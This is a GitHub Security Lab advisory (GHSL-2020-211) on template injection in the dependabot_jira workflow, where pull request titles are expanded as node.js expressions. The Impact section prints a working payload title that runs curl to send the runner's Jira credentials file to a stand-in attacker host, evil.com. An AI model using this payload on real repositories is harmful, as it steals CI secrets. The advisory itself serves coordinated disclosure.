<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">December 3, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-211: Template injection in a GitHub workflow of namin2/dependabot_jira repository</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>The GitHub workflow template in <a href="https://github.com/namin2/dependabot_jira">namin2/dependabot_jira</a> repository is vulnerable to template injection from user comments.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/namin2/dependabot_jira">namin2/dependabot_jira</a> repository</p>

<h2 id="tested-version">Tested Version</h2>

<p>Master branch.</p>

<h2 id="details">Details</h2>

<h3 id="issue-hidden-expression-expansion-of-input-parameters-passed-to-atlassiangajira-create">Issue: Hidden expression expansion of input parameters passed to <code class="language-plaintext highlighter-rouge">atlassian/gajira-create</code></h3>

<p><a href="https://github.com/namin2/dependabot_jira/blob/master/dependabot_jira.yml"><code class="language-plaintext highlighter-rouge">Create Jira Issue</code> step in dependabot_jira.yml</a> workflow is vulnerable to template injection.</p>

<p>The <code class="language-plaintext highlighter-rouge">${{ github.event.pull_request.title }}</code> is used to format input values to <code class="language-plaintext highlighter-rouge">atlassian/gajira-create</code> action:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Create Jira Issue</span>
      <span class="na">id</span><span class="pi">:</span> <span class="s">create</span>
      <span class="na">uses</span><span class="pi">:</span> <span class="s">atlassian/gajira-create@v2.0.0</span>
      <span class="na">with</span><span class="pi">:</span>
        <span class="na">project</span><span class="pi">:</span> <span class="s">${{ env.JIRA_PROJECT }}</span>
        <span class="na">issuetype</span><span class="pi">:</span> <span class="s">${{ env.JIRA_ISSUE_TYPE }}</span>
        <span class="na">summary</span><span class="pi">:</span> <span class="pi">|</span>
          <span class="s">[${{github.event.repository.name }}] ${{github.event.pull_request.title }}</span>
        <span class="na">description</span><span class="pi">:</span> <span class="pi">|</span>
          <span class="s">${{github.event.pull_request.html_url }}</span>
</code></pre></div></div>

<p>The action has a hidden feature - it expands <code class="language-plaintext highlighter-rouge">{{}}</code> internally. This way when the pull request title contains an expression in double curly braces it is evaluated by node.js in these actions.</p>

<h4 id="impact">Impact</h4>

<p>This vulnerability allows for arbitrary code execution in the context of GitHub runner. For example a user may create a pull request with the title:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span> <span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="s2">`curl -d @</span><span class="p">${</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">HOME</span><span class="p">}</span><span class="s2">/.jira.d/credentials http://evil.com`</span><span class="p">)</span> <span class="p">}}</span>
</code></pre></div></div>

<p>which will exfiltrate the secret Jira API token to the attacker controlled server. To make the attack less visible an attacker may modify the title later.</p>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>10/29/2020: Report sent to vendor</li>
  <li>11/05/2020: Issue resolved</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-211</code> in any communication regarding this issue.</p>

   